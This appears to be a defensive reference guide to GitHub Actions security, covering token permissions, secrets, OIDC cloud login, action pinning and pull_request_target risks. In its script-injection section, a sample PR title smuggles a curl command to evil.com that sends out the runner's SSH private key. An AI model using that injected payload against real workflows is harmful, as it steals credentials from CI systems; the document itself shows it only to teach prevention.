# GitHub Actions Security Reference

## GITHUB_TOKEN

### What It Is
Auto-created GitHub App installation token for each workflow run. Scoped to the repository. Expires when job finishes or max 6h (GitHub-hosted), 24h then refreshes (self-hosted).

```yaml
# Access token in steps
${{ secrets.GITHUB_TOKEN }}    # Via secrets context
${{ github.token }}            # Via github context (runner only)
```

### Default Permissions by Event

| Event | `contents` | `pull-requests` | `id-token` |
|-------|-----------|-----------------|----------|
| Push to main/branch (no fork) | `write` | `none` | `none` |
| PR from fork (`pull_request`) | `read` | `none` | `none` |
| `pull_request_target` | `write` | `write` | `none` |
| `workflow_run` | `write` | `write` | `none` |
| `schedule` | `write`* | `none` | `none` |

*Subject to organization policy restrictions.

### Setting Permissions

```yaml
# Workflow-level (applies to all jobs unless overridden)
permissions:
  contents: read
  pull-requests: write

# Job-level (overrides workflow-level)
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write

# Revoke all (empty map)
permissions: {}

# Grant all read
permissions: read-all

# Grant all write (avoid)
permissions: write-all
```

### All Available Scopes

| Scope | Purpose |
|-------|---------|
| `actions` | Manage Actions workflows/runs |
| `artifact-metadata` | Read artifact metadata |
| `attestations` | Create/verify artifact attestations |
| `checks` | Create/update check runs |
| `contents` | Read/write repo content, commits, releases |
| `deployments` | Create/update deployments |
| `discussions` | Read/write GitHub Discussions |
| `id-token` | Request OIDC JWT token |
| `issues` | Read/write issues |
| `models` | Use GitHub Models |
| `packages` | Read/write GitHub Packages |
| `pages` | Read/write GitHub Pages |
| `pull-requests` | Read/write PRs, comments |
| `repository-projects` | Read/write Projects |
| `security-events` | Read/write security alerts |
| `statuses` | Read/write commit statuses |

### Important Token Behaviors

- **Does NOT trigger new workflow runs** (prevents infinite loops), except `workflow_dispatch` and `repository_dispatch`
- **Cannot trigger GitHub Pages builds**
- Push events from GITHUB_TOKEN don't trigger push-triggered workflows
- Use a PAT or deploy key if you need to trigger downstream workflows

---

## Secrets Management

### Creating Secrets

```bash
# CLI
gh secret set MY_SECRET                      # Prompts for value
gh secret set MY_SECRET --body "value"
gh secret set MY_SECRET < secret.txt
gh secret set MY_SECRET --env production     # Environment-level
gh secret set MY_SECRET --org MyOrg         # Organization-level
gh secret list
gh secret delete MY_SECRET
```

### Accessing in Workflows

```yaml
# In step inputs
- uses: some/action@v1
  with:
    token: ${{ secrets.MY_SECRET }}

# As env var (preferred for shell commands)
- env:
    MY_SECRET: ${{ secrets.MY_SECRET }}
  run: curl -H "Authorization: Bearer $MY_SECRET" https://api.example.com

# NEVER in if: conditions (use env var workaround)
- env:
    IS_SET: ${{ secrets.MY_SECRET != '' }}
  run: |
    if [ "$IS_SET" = "true" ]; then
      echo "Secret is set"
    fi
```

### Secrets Limits

| Scope | Max Count | Max Size |
|-------|-----------|---------|
| Repository | 500 | 48 KB |
| Organization | 1,000 | 48 KB |
| Environment | 100 | 48 KB |

### Secrets Availability

| Context | Available? |
|---------|-----------|
| Fork PR (`pull_request`) | No (except GITHUB_TOKEN, read-only) |
| `pull_request_target` | Yes (security risk!) |
| `workflow_run` | Yes |
| Dependabot PRs | No |
| Composite actions | No (pass as inputs) |

### Large Secrets (>48 KB)

```bash
# Encrypt file
gpg --symmetric --cipher-algo AES256 secret-file.json
# Store passphrase as secret: GPG_PASSPHRASE

# In workflow
- run: |
    echo "$GPG_PASSPHRASE" | gpg --batch --yes --passphrase-fd 0 \
      --output secret-file.json secret-file.json.gpg
  env:
    GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
```

### Masking Generated Values

```yaml
- run: |
    TOKEN=$(./generate-token.sh)
    echo "::add-mask::${TOKEN}"           # Mask before any potential output
    echo "token=${TOKEN}" >> "$GITHUB_OUTPUT"
```

---

## Script Injection Prevention

### The Vulnerability

```yaml
# INSECURE - PR title can contain shell metacharacters:
# Title: "foo"; curl -s evil.com/exfil?data=$(cat ~/.ssh/id_rsa)
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

### Safe Pattern: Environment Variables

```yaml
# SECURE - expression stored in env var, not interpolated into script
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$PR_TITLE" =~ ^fix ]]; then
      echo "Bug fix PR"
    fi
```

### Safe Pattern: Use an Action (best)

```yaml
# SECURE - value passed as action input, not shell interpolation
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      if (title.startsWith('fix')) {
        console.log('Bug fix PR');
      }
```

### High-Risk Context Properties (treat as untrusted)

```
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref
github.event.issue.title
github.event.issue.body
github.event.comment.body
github.event.review.body
github.head_ref
github.event.client_payload.*
```

---

## Action Version Pinning

```yaml
# MOST SECURE - immutable commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

# ACCEPTABLE - tag from verified/trusted creator
- uses: actions/checkout@v4

# RISKY - mutable branch reference (avoid)
- uses: actions/checkout@main

# Use Dependabot to auto-update pinned SHAs
# .github/dependabot.yml:
# version: 2
# updates:
#   - package-ecosystem: github-actions
#     directory: /
#     schedule:
#       interval: weekly
```

---

## OIDC (OpenID Connect) for Cloud Auth

Eliminates long-lived cloud credentials stored as secrets. GitHub issues short-lived OIDC tokens that cloud providers verify.

### Required Permission

```yaml
permissions:
  id-token: write    # Required for OIDC token generation
  contents: read
```

### OIDC Token Claims

```json
{
  "sub": "repo:owner/repo:environment:production",
  "iss": "https://token.actions.githubusercontent.com",
  "aud": "https://github.com/owner",
  "ref": "refs/heads/main",
  "sha": "abc123...",
  "repository": "owner/repo",
  "repository_owner": "owner",
  "environment": "production",
  "job_workflow_ref": "owner/repo/.github/workflows/deploy.yml@refs/heads/main",
  "actor": "username",
  "run_id": "1234567890"
}
```

The `sub` claim format (used for trust policy in cloud provider):
```
repo:<owner>/<repo>:ref:refs/heads/<branch>
repo:<owner>/<repo>:environment:<env-name>
repo:<owner>/<repo>:pull_request
```

### AWS OIDC

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          role-session-name: github-actions
          aws-region: us-east-1
      - run: aws s3 ls
```

### Azure OIDC

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
      - run: az account show
```

### GCP OIDC

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
          service_account: 'github-actions@project.iam.gserviceaccount.com'
      - uses: google-github-actions/setup-gcloud@v2
      - run: gcloud info
```

---

## `pull_request_target` Security

```yaml
# DANGEROUS pattern - runs forked PR code with secret access
on:
  pull_request_target:
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGER: fork code
      - run: npm test  # Executes untrusted code with secrets!

# SAFE pattern - only read/write PR metadata (don't run fork code)
on:
  pull_request_target:
    types: [opened, labeled]
jobs:
  label-pr:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
          # Labeler only reads PR metadata, doesn't execute fork code
```

---

## Security Best Practices Summary

### Checklist

- Use `permissions: {}` at workflow level, grant only what each job needs
- Pin actions to commit SHAs for third-party actions (`uses: owner/action@SHA`)
- Use OIDC instead of storing cloud credentials as secrets
- Never interpolate untrusted input directly into shell commands; use env vars
- Add `.github/CODEOWNERS` entry for workflow files: `.github/workflows/ @security-team`
- Never use `pull_request_target` with checkout of PR head
- Restrict `workflow_run` to specific trusted upstream workflows
- Rotate secrets regularly; remove unused secrets
- Use Dependabot for automatic action version updates
- Enable branch protection rules requiring workflow status checks

### Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      github-actions:
        patterns: ['*']
```

**Note:** Dependabot only creates alerts for actions using semantic versioning (not SHA-pinned ones). SHA-pinned actions require manual monitoring but provide stronger security guarantees.
